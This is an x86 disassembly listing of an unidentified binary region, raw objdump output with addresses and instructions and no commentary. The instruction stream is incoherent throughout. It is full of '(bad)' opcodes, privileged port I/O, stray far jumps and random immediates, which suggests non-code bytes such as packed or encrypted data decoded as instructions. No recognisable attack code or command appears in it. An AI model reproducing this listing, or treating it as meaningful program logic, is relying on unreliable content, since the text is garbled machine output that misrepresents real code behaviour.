  41f3a1:	sbb    DWORD PTR [eax-0x5ec45031],edi
  41f3a7:	es jno 0x41f403
  41f3aa:	cld    
  41f3ab:	rcl    BYTE PTR [edi-0x56],cl
  41f3ae:	mov    ebp,0xad1c69f0
  41f3b3:	bound  eax,QWORD PTR [edx+edi*4+0x4b]
  41f3b7:	and    al,0xa0
  41f3b9:	sub    BYTE PTR [edi+0x25],0x8e
  41f3bd:	(bad)  
  41f3be:	imul   ebx,DWORD PTR [ebp+0xd756a48],0x73
  41f3c5:	mov    dl,0x86
  41f3c7:	mov    cl,0xf6
  41f3c9:	stc    
  41f3ca:	add    esp,DWORD PTR [edx+0x2c81b203]
  41f3d0:	push   ss
  41f3d1:	neg    DWORD PTR [edx]
  41f3d3:	sub    al,0x13
  41f3d5:	dec    edi
  41f3d6:	leave  
  41f3d7:	pop    ebp
  41f3d8:	(bad)  
  41f3dc:	aaa    
  41f3dd:	pop    ss
  41f3de:	jle    0x41f3c8
  41f3e0:	pop    ss
  41f3e1:	sti    
  41f3e2:	pop    ecx
  41f3e3:	scas   eax,DWORD PTR es:[edi]
  41f3e4:	ds push ecx
  41f3e6:	in     al,dx
  41f3e7:	(bad)
  41f3ea:	test   DWORD PTR [ebx+0x7011d982],0x9bf1d4a
  41f3f4:	pop    esp
  41f3f5:	jle    0x41f440
  41f3f7:	(bad)  
  41f3f8:	ds aad 0x2d
  41f3fb:	pusha  
  41f3fc:	sbb    bl,BYTE PTR [eax-0x29]
  41f3ff:	sub    al,0x98
  41f401:	mov    ds:0xaf2ff5bd,al
  41f406:	push   0x43
  41f408:	jg     0x41f3b7
  41f40a:	sub    esp,0xfffffffc
  41f40d:	pop    eax
  41f40e:	or     esp,ecx
  41f410:	in     eax,dx
  41f411:	arpl   WORD PTR [ebp+0x5e0488d9],bp
  41f417:	out    0xc9,eax
  41f419:	dec    eax
  41f41a:	dec    eax
  41f41b:	popf   
  41f41c:	jo     0x41f45b
  41f41e:	add    eax,0xef1be44f
  41f423:	imul   ecx,DWORD PTR [edx-0x263fcaa],0xffffffbd
  41f42a:	dec    edi
  41f42b:	xor    al,BYTE PTR [esi]
  41f42d:	mov    esp,0xd79e376e
  41f432:	mov    ch,0x5f
  41f434:	or     ch,BYTE PTR [ebx+0x3623a200]
  41f43a:	aam    0x5
  41f43c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f43d:	dec    ebx
  41f43e:	lds    ecx,FWORD PTR [ebx+0x7c]
  41f441:	xchg   esi,eax
  41f442:	cmp    al,0xf4
  41f444:	dec    ebx
  41f445:	and    al,ch
  41f447:	xchg   edi,eax
  41f448:	jl     0x41f41a
  41f44a:	adc    BYTE PTR es:[edi],bl
  41f44d:	cs push esi
  41f44f:	jl     0x41f498
  41f451:	test   DWORD PTR [ebx+0x33],ebx
  41f454:	fsub   DWORD PTR [ebp+0x295cf407]
  41f45a:	xchg   edx,eax
  41f45b:	push   esp
  41f45c:	cli    
  41f45d:	or     al,0x2
  41f45f:	arpl   dx,bp
  41f461:	xchg   esi,eax
  41f462:	out    dx,eax
  41f463:	xchg   esi,eax
  41f464:	ins    BYTE PTR es:[edi],dx
  41f465:	mov    eax,0xaa27748c
  41f46a:	out    dx,al
  41f46b:	adc    DWORD PTR [edx],0xffffffb3
  41f46e:	jl     0x41f463
  41f470:	div    BYTE PTR [edi-0x4584b4f0]
  41f476:	jno    0x41f49f
  41f478:	or     bh,BYTE PTR [eax]
  41f47a:	popf   
  41f47b:	push   ss
  41f47c:	sbb    al,0x89
  41f47e:	sbb    DWORD PTR [edi+0x2fdd97db],ebp
  41f484:	cmp    eax,0xd19a341e
  41f489:	cmp    eax,0xa781d66f
  41f48e:	pop    esi
  41f48f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f490:	sbb    eax,0x19ce566e
  41f495:	lods   eax,DWORD PTR ds:[esi]
  41f496:	mov    bh,0xaa
  41f498:	jg     0x41f47e
  41f49a:	daa    
  41f49b:	xor    dl,dh
  41f49d:	pop    eax
  41f49e:	jb     0x41f513
  41f4a0:	repz jge 0x41f466
  41f4a3:	clc    
  41f4a4:	iret   
  41f4a5:	mov    al,ds:0x36605a0b
  41f4aa:	fsubr  st(7),st
  41f4ac:	iret   
  41f4ad:	mov    ds:0xbb7c3502,al
  41f4b2:	js     0x41f4eb
  41f4b4:	push   ds
  41f4b5:	adc    al,cl
  41f4b7:	mov    ds:0x68ca7302,eax
  41f4bc:	repnz xor ebp,DWORD PTR [edi-0x4d]
  41f4c0:	test   DWORD PTR [eax-0x9],edx
  41f4c3:	test   BYTE PTR [eax+0x40],bl
  41f4c6:	push   edx
  41f4c7:	shr    BYTE PTR [edx],cl
  41f4c9:	dec    esp
  41f4ca:	outs   dx,DWORD PTR ds:[esi]
  41f4cb:	ins    BYTE PTR es:[edi],dx
  41f4cc:	lds    edi,FWORD PTR [edx]
  41f4ce:	mov    eax,0x95b302f2
  41f4d3:	push   ecx
  41f4d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4d5:	pop    edi
  41f4d6:	cmp    edi,esi
  41f4d8:	add    al,0x39
  41f4da:	call   0x37aa38fd
  41f4df:	mov    BYTE PTR [ebp-0x39],bh
  41f4e2:	and    eax,DWORD PTR [esp+ebx*4-0x294bd079]
  41f4e9:	push   ebp
  41f4ea:	push   cs
  41f4eb:	jle    0x41f4a4
  41f4ed:	les    eax,FWORD PTR [ebx-0x6da3dfee]
  41f4f3:	daa    
  41f4f4:	pop    eax
  41f4f5:	lods   al,BYTE PTR ds:[esi]
  41f4f6:	jl     0x41f4af
  41f4f8:	jl     0x41f55d
  41f4fa:	mov    al,ds:0xb2fdf6e8
  41f4ff:	clc    
  41f500:	mov    edx,0xd4505c95
  41f505:	or     DWORD PTR [edi],ecx
  41f507:	add    eax,0xbf18ed80
  41f50c:	push   ss
  41f50d:	inc    DWORD PTR [ebp-0x6f]
  41f510:	add    BYTE PTR [edx+0x6fb736d5],dh
  41f516:	sub    eax,esp
  41f518:	imul   esi,edx,0x254f31f0
  41f51e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f51f:	jmp    0x5f35:0x8fe8e148
  41f526:	adc    DWORD PTR ds:0x1c987a39,ecx
  41f52c:	xor    BYTE PTR [esi+0x170aa618],al
  41f532:	inc    ebx
  41f533:	adc    eax,0x4d47d97
  41f538:	cwde   
  41f539:	stos   DWORD PTR es:[edi],eax
  41f53a:	adc    edi,ebx
  41f53c:	or     al,0xb9
  41f53e:	sub    eax,0xf5e3f6b5
  41f543:	dec    ebx
  41f544:	adc    eax,DWORD PTR [ebp+0x108d4191]
  41f54a:	push   esp
  41f54b:	mov    ebp,0x988e7b86
  41f550:	xchg   esi,eax
  41f551:	jecxz  0x41f4f7
  41f553:	cmc    
  41f554:	jge    0x41f55f
  41f556:	into   
  41f557:	mov    al,ds:0x98c44eba
  41f55c:	retf   
  41f55d:	js     0x41f52e
  41f55f:	mov    ecx,0x69f7ab03
  41f564:	outs   dx,BYTE PTR ds:[esi]
  41f565:	jmp    0x41f538
  41f567:	dec    edx
  41f568:	jmp    0x3af223e5
  41f56d:	iret   
  41f56e:	jnp    0x41f500
  41f570:	outs   dx,BYTE PTR ds:[esi]
  41f572:	mov    ah,0xd
  41f574:	or     edx,edi
  41f576:	xor    al,BYTE PTR [edx+0x62]
  41f579:	int    0xdd
  41f57b:	or     DWORD PTR [ecx],0x41
  41f57e:	inc    eax
  41f57f:	in     al,0x6f
  41f581:	rcr    BYTE PTR [eax-0x1f33ec22],0x33
  41f588:	pop    esp
  41f589:	and    bl,dl
  41f58b:	addr16 pop edx
  41f58d:	and    dh,BYTE PTR [esi-0x1cca580c]
  41f593:	test   eax,0x6500e710
  41f598:	fld    DWORD PTR [esi+0x78732cb0]
  41f59e:	fcmovu st,st(3)
  41f5a0:	data16 test BYTE PTR [edi-0x21],cl
  41f5a4:	bound  edx,QWORD PTR [ebx]
  41f5a6:	add    DWORD PTR [edi-0x5e651e92],edx
  41f5ac:	xchg   esp,eax
  41f5ad:	cmp    esp,DWORD PTR [eax-0x59559f8]
  41f5b3:	inc    ebx
  41f5b4:	sar    ebp,1
  41f5b6:	inc    edx
  41f5b7:	inc    edx
  41f5b8:	inc    ch
  41f5ba:	popf   
  41f5bb:	adc    eax,0x3e892349
  41f5c0:	adc    BYTE PTR [edi-0x22398bb1],dl
  41f5c6:	es iret 
  41f5c8:	aad    0xfa
  41f5ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5cb:	and    esi,DWORD PTR [edi-0x7]
  41f5ce:	ss mov cl,0x59
  41f5d1:	in     eax,dx
  41f5d2:	lea    ecx,[ebx+ebp*1-0x13514457]
  41f5d9:	push   eax
  41f5da:	sti    
  41f5db:	popf   
  41f5dc:	or     BYTE PTR [ebx],0x5f
  41f5df:	ret    0xe6a5
  41f5e2:	push   eax
  41f5e3:	dec    ebp
  41f5e4:	retf   
  41f5e5:	sbb    bh,bl
  41f5e7:	jge    0x41f610
  41f5e9:	inc    eax
  41f5ea:	xchg   esp,eax
  41f5eb:	xchg   esp,eax
  41f5ec:	fstp   DWORD PTR [esi+0x193cd4c6]
  41f5f2:	mov    ebx,0xd60e347f
  41f5f7:	dec    ecx
  41f5f8:	pop    esi
  41f5f9:	or     BYTE PTR [esi],ah
  41f5fb:	outs   dx,DWORD PTR ds:[esi]
  41f5fc:	aaa    
  41f5fd:	stos   BYTE PTR es:[edi],al
  41f5fe:	in     al,0xa1
  41f600:	outs   dx,BYTE PTR ds:[esi]
  41f601:	sub    esp,esp
  41f603:	int3   
  41f604:	outs   dx,BYTE PTR ds:[esi]
  41f605:	not    dh
  41f607:	repz sar DWORD PTR [ecx],0x2d
  41f60b:	int    0x15
  41f60d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f60e:	mov    ds:0xf47afc34,al
  41f613:	sub    al,0x85
  41f615:	dec    BYTE PTR [ebx-0x1f]
  41f618:	(bad)  
  41f619:	xchg   edi,eax
  41f61a:	jle    0x41f5d0
  41f61c:	pop    edx
  41f61d:	loopne 0x41f5bd
  41f61f:	test   BYTE PTR [esi+0x3aab72a9],0x12
  41f626:	push   ebx
  41f627:	inc    edi
  41f628:	xor    cl,BYTE PTR [eax-0x79401ff9]
  41f62e:	(bad)  
  41f62f:	xchg   ecx,eax
  41f630:	or     ch,ah
  41f632:	dec    eax
  41f633:	sbb    esp,DWORD PTR [ebp-0x10]
  41f636:	fld    DWORD PTR [edi+esi*8-0x43a6ff30]
  41f63d:	push   esi
  41f63e:	add    esi,ebp
  41f640:	add    ecx,eax
  41f642:	retf   
  41f643:	jae    0x41f5fe
  41f645:	mov    ebx,0xe2ca2046
  41f64a:	inc    ebp
  41f64b:	cwde   
  41f64c:	ret    
  41f64d:	jp     0x41f5f4
  41f64f:	cwde   
  41f650:	shl    dh,0xd7
  41f653:	jns    0x41f696
  41f655:	(bad)  
  41f656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f657:	clc    
  41f658:	je     0x41f605
  41f65a:	add    al,0x87
  41f65c:	retf   0xae6c
  41f65f:	rol    BYTE PTR [ebp+edi*1+0x5e],0xfd
  41f664:	js     0x41f6c4
  41f666:	aaa    
  41f667:	scas   al,BYTE PTR es:[edi]
  41f668:	jmp    0x82b3126b
  41f66d:	adc    bl,0xfe
  41f670:	shl    ebp,0xa
  41f673:	and    bl,cl
  41f675:	push   esi
  41f676:	out    dx,eax
  41f677:	sbb    BYTE PTR [eax-0x6],dl
  41f67a:	push   es
  41f67b:	jecxz  0x41f62a
  41f67d:	lea    edi,[esi-0x28e8755]
  41f683:	sub    al,0xaa
  41f685:	cmp    ch,BYTE PTR [ecx]
  41f687:	gs out 0x62,al
  41f68a:	dec    ebx
  41f68b:	dec    ebx
  41f68c:	mov    ds,WORD PTR [esi+0x18]
  41f68f:	xchg   esp,eax
  41f690:	jo     0x41f6cc
  41f692:	aas    
  41f693:	dec    edx
  41f694:	sahf   
  41f695:	mov    WORD PTR es:[bp+di-0x43],ss
  41f69a:	sar    DWORD PTR [esi-0x274358f3],0x80
  41f6a1:	dec    ecx
  41f6a2:	cwde   
  41f6a3:	cmp    al,0xb6
  41f6a5:	mov    eax,ds:0x5d46c40b
  41f6aa:	xchg   BYTE PTR [esi],ah
  41f6ac:	mov    bl,0xca
  41f6ae:	and    ebp,DWORD PTR [esi]
  41f6b0:	dec    ecx
  41f6b1:	or     edi,DWORD PTR [edi+ebp*2+0x4582cf13]
  41f6b8:	mov    gs,WORD PTR [eax+0x74]
  41f6bb:	jge    0x41f672
  41f6bd:	in     al,0x12
  41f6bf:	mov    bh,0x63
  41f6c1:	and    eax,0x4e90c39e
  41f6c6:	addr16 xchg esp,eax
  41f6c8:	aam    0x3d
  41f6ca:	mov    esi,0x25eb8153
  41f6cf:	add    esp,DWORD PTR [ebp-0x308e1eef]
  41f6d5:	jns    0x41f734
  41f6d7:	jae    0x41f717
  41f6d9:	jle    0x41f74e
  41f6db:	fisttp QWORD PTR [ebx+0x6343447]
  41f6e1:	jge    0x41f74e
  41f6e3:	lods   eax,DWORD PTR ds:[esi]
  41f6e4:	fsubr  DWORD PTR [edx+0x5f]
  41f6e7:	js     0x41f66b
  41f6e9:	or     dh,BYTE PTR ss:[esi+edi*1-0x77ce8577]
  41f6f1:	mov    esp,0xa207344
  41f6f6:	jecxz  0x41f686
  41f6f8:	fild   DWORD PTR ds:0x967345ed
  41f6fe:	or     bh,cl
  41f700:	ret    
  41f701:	xlat   BYTE PTR ds:[ebx]
  41f702:	js     0x41f6ee
  41f704:	xor    BYTE PTR [esi-0x7688aaa3],bh
  41f70a:	(bad)  
  41f70b:	and    BYTE PTR [ebp-0x7],bl
  41f70e:	in     al,0x8c
  41f710:	int3   
  41f711:	push   cs
  41f712:	test   al,0x46
  41f714:	jbe    0x41f76a
  41f716:	push   ss
  41f717:	(bad)  [edx-0x68]
  41f71a:	int3   
  41f71b:	cmp    DWORD PTR ds:0xc33f60f3,0x61
  41f722:	in     eax,dx
  41f723:	xor    DWORD PTR [esi-0x7e],esi
  41f726:	add    ch,BYTE PTR [ebp+0x7a]
  41f729:	out    dx,al
  41f72a:	pushf  
  41f72b:	or     BYTE PTR [edx+ecx*2-0x5545469a],bl
  41f732:	aam    0x58
  41f734:	shl    DWORD PTR [eax-0x75],0xe8
  41f738:	sar    DWORD PTR [esi+0x424ec7ff],1
  41f73e:	aam    0xa2
  41f740:	fstp   DWORD PTR [esi+0x1a7213fc]
  41f746:	and    BYTE PTR [ebx],dl
  41f748:	bnd jae 0x41f763
  41f74b:	lods   al,BYTE PTR ds:[esi]
  41f74c:	aam    0x83
  41f74e:	cdq    
  41f74f:	(bad)  
  41f750:	xchg   edx,eax
  41f751:	xor    al,0x55
  41f753:	inc    edi
  41f754:	sbb    al,0xe9
  41f756:	pop    esp
  41f757:	stos   BYTE PTR es:[edi],al
  41f758:	mov    al,0xf7
  41f75a:	inc    ebp
  41f75b:	push   0x3ffabb42
  41f760:	push   edi
  41f761:	cmc    
  41f762:	mov    ds:0xfbee973f,al
  41f767:	jns    0x41f797
  41f769:	mov    dh,0x26
  41f76b:	inc    edi
  41f76c:	and    eax,0x2c2be114
  41f771:	scas   eax,DWORD PTR es:[edi]
  41f772:	je     0x41f730
  41f774:	or     eax,0x9ab54f3
  41f779:	push   eax
  41f77a:	call   0x1f66a66e
  41f77f:	popf   
  41f780:	sbb    al,0xbe
  41f782:	or     DWORD PTR [ecx+0x33280606],0x446bca2c
  41f78c:	inc    esp
  41f78d:	lahf   
  41f78e:	je     0x41f73d
  41f790:	pop    ss
  41f791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f792:	rcl    DWORD PTR [esi],cl
  41f794:	pop    ss
  41f795:	sbb    eax,0x5b83afa5
  41f79a:	cmp    ebx,ebp
  41f79c:	lods   eax,DWORD PTR ds:[esi]
  41f79d:	sbb    ch,BYTE PTR [ecx]
  41f79f:	adc    ebx,DWORD PTR [edi]
  41f7a1:	dec    esp
  41f7a2:	cs test eax,0x8eea5aad
  41f7a8:	test   al,0x44
  41f7aa:	jg     0x41f814
  41f7ac:	jmp    DWORD PTR [eax+esi*4-0x1157891a]
  41f7b3:	and    DWORD PTR [edi-0x7ff4b089],ebx
  41f7b9:	pop    esi
  41f7ba:	push   0xdaffd39a
  41f7bf:	popf   
  41f7c0:	(bad)  
  41f7c1:	arpl   dx,ax
  41f7c3:	das    
  41f7c4:	fcomp  QWORD PTR [esi]
  41f7c7:	inc    eax
  41f7c8:	cmp    al,0xe3
  41f7ca:	int3   
  41f7cb:	(bad)  
  41f7cc:	push   ebx
  41f7cd:	cmp    al,0x27
  41f7cf:	or     al,0x43
  41f7d1:	rcl    BYTE PTR [edx-0x18],0x1
  41f7d5:	fcomp  QWORD PTR [edi+0x10]
  41f7d8:	jp     0x41f76a
  41f7da:	or     BYTE PTR [eax+0x58873c47],0xc
  41f7e1:	sub    DWORD PTR [edx+0x77],ecx
  41f7e4:	adc    eax,0xefe1de9f
  41f7e9:	xchg   edi,eax
  41f7ea:	fdiv   QWORD PTR [eax]
  41f7ec:	xchg   ebx,eax
  41f7ed:	pop    ebx
  41f7ee:	das    
  41f7ef:	mov    esi,0x413fae9d
  41f7f4:	fcmovnb st,st(5)
  41f7f6:	add    bh,0x3e
  41f7f9:	fsubr  DWORD PTR [ebx+0x70]
  41f7fc:	stos   DWORD PTR es:[edi],eax
  41f7fd:	mov    dh,0x65
  41f7ff:	pop    esi
  41f800:	sub    eax,0xe6ed857a
  41f805:	ds call 0xf736:0x65dde970
  41f80d:	adc    eax,0xf0c9e96f
  41f812:	ins    DWORD PTR es:[edi],dx
  41f813:	pop    ss
  41f814:	shl    DWORD PTR [esi+0x36],0x72
  41f818:	add    BYTE PTR [ebp+0xb77411f],bl
  41f81e:	repz sbb DWORD PTR [edx-0x11dc727d],esi
  41f825:	pop    esp
  41f826:	jp     0x41f871
  41f828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f829:	xor    esi,DWORD PTR [edi-0x74f45741]
  41f82f:	mov    bl,0xcd
  41f831:	or     BYTE PTR [edx+edx*2],bl
  41f834:	retf   0x817a
  41f837:	int    0xae
  41f839:	mov    esi,0x930388b1
  41f83e:	nop
  41f83f:	inc    ebp
  41f840:	xchg   ebx,eax
  41f841:	icebp  
  41f842:	fwait
  41f843:	jo     0x41f7e5
  41f845:	mov    edi,0x2ae0a1b1
  41f84a:	jmp    0x41f8a2
  41f84c:	xchg   edi,eax
  41f84d:	pop    es
  41f84e:	push   esp
  41f84f:	jle    0x41f82a
  41f851:	sbb    ebx,DWORD PTR [esp+eiz*2+0x7a]
  41f855:	rol    DWORD PTR [eax],0xc3
  41f858:	stos   BYTE PTR es:[edi],al
  41f859:	inc    ebx
  41f85a:	pop    eax
  41f85b:	loop   0x41f8a3
  41f85d:	jecxz  0x41f8db
  41f85f:	ins    BYTE PTR es:[edi],dx
  41f860:	inc    eax
  41f861:	jae    0x41f858
  41f863:	mov    dl,dh
  41f865:	dec    edx
  41f866:	or     eax,0x6bc0df3a
  41f86b:	shr    DWORD PTR [ebx],0xbc
  41f86e:	dec    esi
  41f86f:	fmul   QWORD PTR [eax-0x15acef1d]
  41f875:	retf   0x1245
  41f878:	int    0xed
  41f87a:	jnp    0x41f822
  41f87c:	jg     0x41f88f
  41f87e:	inc    edi
  41f87f:	xchg   edx,eax
  41f880:	loope  0x41f872
  41f882:	fdivr  DWORD PTR [edx*1+0x8c07511]
  41f889:	sub    dl,BYTE PTR [ebp-0x773c1cd2]
  41f88f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f890:	inc    edi
  41f891:	jae    0x41f8eb
  41f893:	mov    bh,0xf
  41f895:	add    BYTE PTR [edi-0x6badbf56],bl
  41f89b:	sub    al,0x65
  41f89d:	mov    bh,0x1
  41f8a0:	push   edi
  41f8a1:	sti    
  41f8a2:	xor    BYTE PTR [esi+0x10],0xcc
  41f8a6:	ins    BYTE PTR es:[edi],dx
  41f8a7:	cmp    DWORD PTR [ecx],ebp
  41f8a9:	out    dx,eax
  41f8aa:	push   es
  41f8ab:	sub    eax,0xe7769bae
  41f8b0:	cld    
  41f8b1:	sub    al,0x81
  41f8b3:	int3   
  41f8b4:	daa    
  41f8b5:	xor    eax,0x1b02dfe
  41f8ba:	lahf   
  41f8bb:	cmp    al,0xa5
  41f8bd:	mov    esi,0x50a880c9
  41f8c2:	xor    eax,0xc1c76124
  41f8c7:	shr    BYTE PTR [eax+0x49b88431],cl
  41f8cd:	mov    esi,edi
  41f8cf:	mov    ecx,0x6eaad0a3
  41f8d4:	nop
  41f8d5:	mov    eax,ds:0xd38dfe21
  41f8da:	sbb    ah,cl
  41f8dc:	adc    dl,BYTE PTR [edx]
  41f8de:	dec    eax
  41f8df:	fcomp  QWORD PTR [ebp-0x5e6ca283]
  41f8e5:	in     eax,0x1f
  41f8e7:	sub    BYTE PTR [ecx+0x60],bh
  41f8ea:	adc    al,0x2c
  41f8ec:	pusha  
  41f8ed:	or     dh,BYTE PTR [edx]
  41f8ef:	loope  0x41f948
  41f8f1:	outs   dx,BYTE PTR ds:[esi]
  41f8f2:	pop    ds
  41f8f3:	or     DWORD PTR [eax],edx
  41f8f5:	mov    eax,0xb52d995a
  41f8fa:	daa    
  41f8fb:	lds    edx,FWORD PTR gs:[eax+eiz*8]
  41f8ff:	push   ss
  41f900:	adc    BYTE PTR [eax],cl
  41f902:	push   0xffffffb5
  41f904:	fld    TBYTE PTR [ebp-0x13]
  41f907:	aas    
  41f908:	inc    edi
  41f909:	xchg   ecx,eax
  41f90a:	pop    esp
  41f90b:	mov    esp,0xe83cda11
  41f910:	mov    ds:0x9f180d8e,eax
  41f915:	pop    esp
  41f916:	rol    DWORD PTR [ebx+0x52],cl
  41f919:	add    al,0xde
  41f91b:	adc    eax,0x755167ec
  41f920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f921:	and    eax,0x8aee3651
  41f926:	std    
  41f927:	scas   al,BYTE PTR es:[edi]
  41f928:	push   cs
  41f929:	out    dx,eax
  41f92a:	add    al,0x64
  41f92c:	mov    ds:0x4fe899c7,al
  41f931:	out    dx,al
  41f932:	std    
  41f933:	xlat   BYTE PTR ds:[ebx]
  41f934:	mov    BYTE PTR [edi-0x5a7b551a],ch
  41f93a:	ja     0x41f966
  41f93c:	shr    BYTE PTR [esi],0x86
  41f93f:	or     ecx,esp
  41f941:	fwait
  41f942:	jmp    0x41f997
  41f944:	adc    BYTE PTR [esi-0x68],bl
  41f947:	xor    eax,0xaeb4175c
  41f94c:	adc    eax,0xa52228fe
  41f951:	mov    bl,0xd3
  41f953:	and    BYTE PTR [esi+ebp*8+0x1b],0x74
  41f958:	mov    ss,WORD PTR [eax+0x6f]
  41f95b:	push   edx
  41f95c:	addr16 dec ecx
  41f95e:	iret   
  41f95f:	jo     0x41f8e5
  41f961:	or     eax,0xde7fd5ae
  41f966:	cs and eax,0xe137cb77
  41f96c:	fld    DWORD PTR [edi]
  41f96e:	gs inc ebx
  41f970:	push   esp
  41f971:	jge    0x41f9b5
  41f973:	sub    al,BYTE PTR [edi+0x22dbe56e]
  41f979:	mov    edi,0x49d93744
  41f97e:	pop    ebp
  41f97f:	push   cs
  41f980:	ret    0x8736
  41f983:	dec    ecx
  41f984:	xchg   DWORD PTR [eax+edx*4+0x2af6da88],ecx
  41f98b:	int    0x24
  41f98d:	repz dec edx
  41f98f:	pop    esp
  41f990:	nop
  41f991:	bound  ebp,QWORD PTR [ebp+esi*2-0x9]
  41f995:	add    bl,0xd7
  41f998:	shl    bh,1
  41f99a:	shr    cl,cl
  41f99c:	jnp    0x41f9bb
  41f99e:	rcr    BYTE PTR [ecx+0x76],cl
  41f9a1:	pop    ebx
  41f9a2:	sub    BYTE PTR [edi+0x3b98c4a4],0xe7
  41f9a9:	add    eax,DWORD PTR [ecx-0x6e]
  41f9ac:	test   al,0xd1
  41f9ae:	test   eax,0x2bb2df41
  41f9b3:	fistp  WORD PTR [ebx+0x3f]
  41f9b6:	imul   ebx,DWORD PTR [edx+0x6f3dbb20],0x1fb64c
  41f9c0:	rol    BYTE PTR [eax-0x271672db],cl
  41f9c6:	jbe    0x41f977
  41f9c8:	icebp  
  41f9c9:	push   ebx
  41f9ca:	cmp    al,0x84
  41f9cc:	mov    ds:0x958c3bb0,al
  41f9d1:	nop
  41f9d2:	rol    BYTE PTR [eax+0x6693cb80],cl
  41f9d8:	sbb    BYTE PTR ds:0x3e7ef129,ch
  41f9de:	ja     0x41f9e9
  41f9e0:	xor    al,0x42
  41f9e2:	stc    
  41f9e3:	out    dx,al
  41f9e4:	popa   
  41f9e5:	mov    DWORD PTR [edi+0x4e],eax
  41f9e8:	and    cl,BYTE PTR [ebx]
  41f9ea:	stos   BYTE PTR es:[edi],al
  41f9eb:	jmp    DWORD PTR [esi]
  41f9ed:	jg     0x41f9d6
  41f9ef:	pop    ebp
  41f9f0:	add    al,0x6e
  41f9f2:	nop
  41f9f3:	pop    ecx
  41f9f4:	xchg   edx,eax
  41f9f5:	lock (bad) 
  41f9f8:	and    esi,0xfffffff8
  41f9fb:	test   BYTE PTR [ebx],bl
  41f9fd:	into   
  41f9fe:	sub    dl,BYTE PTR [edi-0x7688852]
  41fa04:	mov    ds:0xfb78a5e3,al
  41fa09:	xchg   esi,eax
  41fa0a:	sub    al,0xd0
  41fa0c:	fsubrp st(6),st
  41fa0e:	les    ebp,FWORD PTR [ebx-0x57]
  41fa11:	ret    
  41fa12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa13:	mov    ah,0x6d
  41fa15:	loopne 0x41f9d7
  41fa17:	(bad)  
  41fa18:	cld    
  41fa19:	mov    esp,DWORD PTR [eax-0x7bf0ec91]
  41fa1f:	ret    0x7b44
  41fa22:	hlt    
  41fa23:	ds ret 0x8a37
  41fa27:	inc    edx
  41fa28:	cwde   
  41fa29:	inc    ebx
  41fa2a:	or     DWORD PTR [esp+esi*8],0xd4e4796c
  41fa31:	fcmovbe st,st(0)
  41fa33:	and    edi,eax
  41fa35:	jo     0x41f9ca
  41fa37:	push   esp
  41fa38:	scas   eax,DWORD PTR es:[edi]
  41fa39:	int    0xf7
  41fa3b:	scas   eax,DWORD PTR es:[edi]
  41fa3c:	push   ss
  41fa3d:	(bad)
  41fa41:	xor    ch,BYTE PTR [esi+eax*2+0x6]
  41fa45:	test   eax,0xe3fda413
  41fa4a:	jmp    0x1ae3:0xf59b74ef
  41fa51:	push   0x1a
  41fa53:	push   edx
  41fa54:	inc    esp
  41fa55:	cmc    
  41fa56:	jge    0x41faab
  41fa58:	xchg   ebx,eax
  41fa59:	or     eax,0xc72b24fe
  41fa5e:	and    ebp,DWORD PTR [ebp+ebp*2+0x6f]
  41fa62:	lds    esp,FWORD PTR [esi]
  41fa64:	fmul   DWORD PTR [ebx-0x2d038178]
  41fa6a:	xchg   edi,eax
  41fa6b:	xchg   ebp,eax
  41fa6c:	(bad)  
  41fa6d:	mov    bh,0x63
  41fa6f:	push   ebp
  41fa70:	push   edi
  41fa71:	inc    edx
  41fa72:	aaa    
  41fa73:	cmp    dh,BYTE PTR [eax-0x79]
  41fa76:	push   esp
  41fa77:	inc    ebp
  41fa78:	fisttp QWORD PTR [esi-0x2140b98c]
  41fa7e:	(bad)  
  41fa80:	es push es
  41fa82:	dec    ebp
  41fa83:	fmul   DWORD PTR [ecx-0x52]
  41fa86:	(bad)  
  41fa87:	loopne 0x41fa7f
  41fa89:	daa    
  41fa8a:	iret   
  41fa8b:	pop    ss
  41fa8c:	xchg   ebx,eax
  41fa8d:	enter  0x9c7e,0x5b
  41fa91:	cmp    DWORD PTR [ebx+0x14],ebp
  41fa94:	out    0x92,eax
  41fa96:	push   esi
  41fa97:	sbb    ecx,DWORD PTR [ecx]
  41fa99:	push   esp
  41fa9a:	sbb    ebx,DWORD PTR [edi]
  41fa9c:	jecxz  0x41fad7
  41fa9e:	adc    BYTE PTR [ebx+0x48],0xea
  41faa2:	in     al,0xba
  41faa4:	ins    BYTE PTR es:[edi],dx
  41faa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faa7:	sbb    ebp,ebx
  41faa9:	lock stc 
  41faab:	cli    
  41faac:	jl     0x41fae9
  41faae:	mov    dh,0xa1
  41fab0:	mov    eax,0x5c66b00b
  41fab5:	(bad)  
  41fab6:	jns    0x41fa60
  41fab8:	enter  0x603c,0x38
  41fabc:	and    DWORD PTR [edi+0x9],esp
  41fabf:	push   esp
  41fac0:	sub    eax,ecx
  41fac2:	pop    esi
  41fac3:	xor    al,0x71
  41fac5:	xor    dl,BYTE PTR [ebx]
  41fac7:	jmp    0xe1b62f83
  41facc:	outs   dx,DWORD PTR ds:[esi]
  41facd:	stos   DWORD PTR es:[edi],eax
  41face:	in     al,0x62
  41fad0:	jmp    0x123e:0xf99d212d
  41fad7:	into   
  41fad8:	stc    
  41fad9:	imul   ecx,DWORD PTR [edi-0x696c91c4],0x36323061
  41fae3:	lods   eax,DWORD PTR ds:[esi]
  41fae4:	mov    DWORD PTR [ecx+0x44],esi
  41fae7:	imul   esp,DWORD PTR [ebx],0x969d4d6b
  41faed:	shl    DWORD PTR [edi+0x29],cl
  41faf0:	shl    DWORD PTR [ebx],0x5
  41faf3:	test   DWORD PTR [edx-0x36],esi
  41faf6:	sub    cl,BYTE PTR [eax]
  41faf8:	push   0xfffffff6
  41fafa:	into   
  41fafb:	pop    esi
  41fafc:	sbb    BYTE PTR [eax],cl
